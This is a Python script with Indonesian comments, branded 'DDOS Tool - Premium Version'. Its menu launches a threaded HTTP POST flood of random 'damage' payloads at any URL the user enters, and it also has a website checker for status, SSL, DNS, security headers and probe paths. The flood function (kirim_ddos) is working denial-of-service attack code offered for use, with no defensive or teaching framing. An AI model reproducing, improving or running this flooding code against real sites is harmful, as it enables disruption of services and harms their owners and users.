import os
import sys
import time
import random
import string
import requests
import threading
from colorama import Fore, init
from module import cek_status_website, cek_ssl_website, cek_dns, cek_hsts, cek_cors

# Inisialisasi colorama
init(autoreset=True)

# Fungsi untuk menampilkan teks secara bertahap
def hiasan_teks(teks):
    for huruf in teks:
        sys.stdout.write(huruf)
        sys.stdout.flush()
        time.sleep(0.05)
    print()

# Fungsi untuk membersihkan layar
def bersihkan_layar():
    os.system('cls' if os.name == 'nt' else 'clear')

# Header dengan logo ASCII
def tampilkan_logo():
    logo = '''
██████╗░██████╗░░█████╗░░██████╗██╗░░░██╗██████╗░
██╔══██╗██╔══██╗██╔══██╗██╔════╝██║░░░██║╚════██╗
██║░░██║██║░░██║██║░░██║╚█████╗░╚██╗░██╔╝░█████╔╝
██║░░██║██║░░██║██║░░██║░╚═══██╗░╚████╔╝░░╚═══██╗
██████╔╝██████╔╝╚█████╔╝██████╔╝░░╚██╔╝░░██████╔╝
╚═════╝░╚═════╝░░╚════╝░╚═════╝░░░░╚═╝░░░╚═════╝░
    '''
    print(Fore.YELLOW + logo)

# Fungsi untuk membuat payload acak
def generate_random_payload(ukuran_damage):
    return ''.join(random.choices(string.ascii_letters + string.digits + string.punctuation, k=ukuran_damage))

# Fungsi untuk mengirim request DDOS
def kirim_ddos(url, jumlah_ddos, ukuran_damage):
    sukses_count = 0
    max_threads = 100  # Batas jumlah thread

    def ddos_thread():
        nonlocal sukses_count
        try:
            payload = generate_random_payload(ukuran_damage)
            headers = {'User-Agent': random.choice([
                'Mozilla/5.0', 'Chrome/97.0', 'Safari/537.36', 'Edge/91.0'
            ])}
            response = requests.post(url, data=payload, headers=headers)
            if response.status_code == 200:
                sukses_count += 1
                print(Fore.GREEN + f"[✔] DDOS berhasil ke {url}")
            else:
                print(Fore.RED + f"[✘] DDOS gagal, status: {response.status_code}")
        except Exception as e:
            print(Fore.RED + f"[✘] Error: {e}")

    if jumlah_ddos > max_threads:
        print(Fore.RED + f"Jumlah DDOS terlalu besar. Maksimal: {max_threads}")
        return

    threads = []
    for _ in range(jumlah_ddos):
        thread = threading.Thread(target=ddos_thread)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print(Fore.CYAN + f"\nTotal DDOS berhasil: {sukses_count} dari {jumlah_ddos}")

def cek_status_dan_fitur_lengkap(url):
    try:
        # Pengecekan status HTTP
        print(Fore.YELLOW + "\n[1] Mengecek Status HTTP...")
        response = cek_status_website(url)
        if response:
            print(Fore.GREEN + f"Website {url} aktif! (Status Code: {response.status_code})")
        else:
            print(Fore.RED + f"Website {url} tidak dapat diakses.")

        # Pengecekan SSL/TLS
        print(Fore.YELLOW + "\n[2] Mengecek SSL/TLS...")
        cek_ssl_website(url)

        # Pengecekan DNS Records
        print(Fore.YELLOW + "\n[3] Mengecek DNS Records...")
        cek_dns(url)

        # Pengecekan HSTS
        print(Fore.YELLOW + "\n[4] Mengecek HSTS...")
        cek_hsts(url)

        # Pengecekan CORS
        print(Fore.YELLOW + "\n[5] Mengecek CORS...")
        cek_cors(url)

        # Pengecekan Page Load Time
        print(Fore.YELLOW + "\n[6] Mengecek Page Load Time...")
        try:
            start_time = time.time()
            requests.get(url, timeout=10)
            load_time = time.time() - start_time
            print(Fore.GREEN + f"Page Load Time: {load_time:.2f} detik")
        except Exception as e:
            print(Fore.RED + f"Gagal mengecek Page Load Time: {e}")

        # Pengecekan Redirects
        print(Fore.YELLOW + "\n[7] Mengecek Redirects...")
        try:
            response = requests.get(url, allow_redirects=True, timeout=10)
            if len(response.history) > 0:
                print(Fore.GREEN + f"Website mengalami {len(response.history)} pengalihan.")
                for i, redirect in enumerate(response.history, 1):
                    print(Fore.CYAN + f"  Redirect {i}: {redirect.url}")
            else:
                print(Fore.GREEN + "Tidak ada pengalihan URL.")
        except Exception as e:
            print(Fore.RED + f"Gagal mengecek Redirects: {e}")

        # Pengecekan Content Security Policy (CSP)
        print(Fore.YELLOW + "\n[8] Mengecek Content Security Policy (CSP)...")
        try:
            response = requests.get(url, timeout=10)
            csp = response.headers.get("Content-Security-Policy", "Tidak diatur")
            print(Fore.GREEN + f"CSP: {csp}")
        except Exception as e:
            print(Fore.RED + f"Gagal mengecek CSP: {e}")

        # Pengecekan Server Headers
        print(Fore.YELLOW + "\n[9] Mengecek Server Headers...")
        try:
            response = requests.get(url, timeout=10)
            server_header = response.headers.get("Server", "Tidak diatur")
            print(Fore.GREEN + f"Server Header: {server_header}")
        except Exception as e:
            print(Fore.RED + f"Gagal mengecek Server Headers: {e}")

        # Pengecekan robots.txt
        print(Fore.YELLOW + "\n[10] Mengecek robots.txt...")
        try:
            robots_url = url.rstrip("/") + "/robots.txt"
            response = requests.get(robots_url, timeout=10)
            if response.status_code == 200:
                print(Fore.GREEN + f"robots.txt ditemukan:\n{response.text}")
            else:
                print(Fore.RED + "robots.txt tidak ditemukan.")
        except Exception as e:
            print(Fore.RED + f"Gagal mengecek robots.txt: {e}")

        # Pengecekan jenis konten (Content-Type)
        print(Fore.YELLOW + "\n[11] Mengecek Content-Type...")
        try:
            response = requests.get(url, timeout=10)
            content_type = response.headers.get("Content-Type", "Tidak diatur")
            print(Fore.GREEN + f"Content-Type: {content_type}")
        except Exception as e:
            print(Fore.RED + f"Gagal mengecek Content-Type: {e}")

        # Pengecekan X-Frame-Options
        print(Fore.YELLOW + "\n[12] Mengecek X-Frame-Options...")
        try:
            response = requests.get(url, timeout=10)
            x_frame = response.headers.get("X-Frame-Options", "Tidak diatur")
            print(Fore.GREEN + f"X-Frame-Options: {x_frame}")
        except Exception as e:
            print(Fore.RED + f"Gagal mengecek X-Frame-Options: {e}")

        # Pengecekan X-XSS-Protection
        print(Fore.YELLOW + "\n[13] Mengecek X-XSS-Protection...")
        try:
            response = requests.get(url, timeout=10)
            x_xss_protection = response.headers.get("X-XSS-Protection", "Tidak diatur")
            print(Fore.GREEN + f"X-XSS-Protection: {x_xss_protection}")
        except Exception as e:
            print(Fore.RED + f"Gagal mengecek X-XSS-Protection: {e}")

        # Pengecekan pengaturan cookies
        print(Fore.YELLOW + "\n[14] Mengecek Cookies...")
        try:
            response = requests.get(url, timeout=10)
            cookies = response.cookies.get_dict()
            if cookies:
                print(Fore.GREEN + f"Cookies ditemukan: {cookies}")
            else:
                print(Fore.RED + "Tidak ada cookies ditemukan.")
        except Exception as e:
            print(Fore.RED + f"Gagal mengecek cookies: {e}")

        # Pengecekan status kode 400
        print(Fore.YELLOW + "\n[15] Mengecek Status Code 400...")
        try:
            response = requests.get(url + "/bad-request", timeout=10)
            if response.status_code == 400:
                print(Fore.GREEN + "Status Code 400 ditemukan")
            else:
                print(Fore.RED + "Tidak ada Status Code 400")
        except Exception as e:
            print(Fore.RED + f"Gagal mengecek Status Code 400: {e}")

        # Pengecekan status kode 500
        print(Fore.YELLOW + "\n[16] Mengecek Status Code 500...")
        try:
            response = requests.get(url + "/internal-error", timeout=10)
            if response.status_code == 500:
                print(Fore.GREEN + "Status Code 500 ditemukan")
            else:
                print(Fore.RED + "Tidak ada Status Code 500")
        except Exception as e:
            print(Fore.RED + f"Gagal mengecek Status Code 500: {e}")

        # Pengecekan status kode 503
        print(Fore.YELLOW + "\n[17] Mengecek Status Code 503...")
        try:
            response = requests.get(url + "/service-unavailable", timeout=10)
            if response.status_code == 503:
                print(Fore.GREEN + "Status Code 503 ditemukan")
            else:
                print(Fore.RED + "Tidak ada Status Code 503")
        except Exception as e:
            print(Fore.RED + f"Gagal mengecek Status Code 503: {e}")

        # Pengecekan status kode 401
        print(Fore.YELLOW + "\n[18] Mengecek Status Code 401...")
        try:
            response = requests.get(url + "/unauthorized", timeout=10)
            if response.status_code == 401:
                print(Fore.GREEN + "Status Code 401 ditemukan")
            else:
                print(Fore.RED + "Tidak ada Status Code 401")
        except Exception as e:
            print(Fore.RED + f"Gagal mengecek Status Code 401: {e}")

        # Pengecekan status kode 403
        print(Fore.YELLOW + "\n[19] Mengecek Status Code 403...")
        try:
            response = requests.get(url + "/forbidden", timeout=10)
            if response.status_code == 403:
                print(Fore.GREEN + "Status Code 403 ditemukan")
            else:
                print(Fore.RED + "Tidak ada Status Code 403")
        except Exception as e:
            print(Fore.RED + f"Gagal mengecek Status Code 403: {e}")

        # Pengecekan status kode 404
        print(Fore.YELLOW + "\n[20] Mengecek Status Code 404...")
        try:
            response = requests.get(url + "/not-found", timeout=10)
            if response.status_code == 404:
                print(Fore.GREEN + "Status Code 404 ditemukan")
            else:
                print(Fore.RED + "Tidak ada Status Code 404")
        except Exception as e:
            print(Fore.RED + f"Gagal mengecek Status Code 404: {e}")

    except Exception as e:
        print(Fore.RED + f"Terjadi error saat pengecekan: {e}")
        
# Menu utama
def main():
    while True:
        bersihkan_layar()
        tampilkan_logo()

        print(Fore.BLUE + "╔═══════════════════════════════════════════════════╗")
        print(Fore.BLUE + "║                DDOS Tool - Premium Version        ║") 
        print(Fore.BLUE + "║                BY- REN9999 TT- sistem9999         ║")      
        print(Fore.BLUE + "╚═══════════════════════════════════════════════════╝")

        print(Fore.GREEN + "1. Langsung gas ken DDOS")
        print(Fore.CYAN + "2. Cek status website")
        print(Fore.MAGENTA + "3. Keluar")

        pilihan = input(Fore.WHITE + "Pilih opsi (1-3): ")
        if pilihan == '1':
            try:
                url = input(Fore.YELLOW + "Masukkan URL website (dengan http/https): ")
                jumlah = int(input(Fore.YELLOW + "Masukkan jumlah DDOS: "))
                damage = int(input(Fore.YELLOW + "Masukkan ukuran damage (bytes): "))
                kirim_ddos(url, jumlah, damage)
            except ValueError:
                print(Fore.RED + "Input tidak valid. Pastikan memasukkan angka!")
                input("Tekan Enter untuk kembali ke menu.")
        elif pilihan == '2':
            url = input(Fore.YELLOW + "Masukkan URL website (dengan http/https): ")
            cek_status_dan_fitur_lengkap(url)  # Memanggil fungsi cek_status_dan_fitur_lengkap
            input(Fore.WHITE + "\nTekan Enter untuk kembali ke menu.")
            time.sleep(3)
        elif pilihan == '3':
            print(Fore.CYAN + "Keluar dari program. Sampai jumpa!")
            break
        else:
            print(Fore.RED + "Pilihan tidak valid!")
            input(Fore.WHITE + "Tekan Enter untuk kembali ke menu.")

if __name__ == "__main__":
    main()
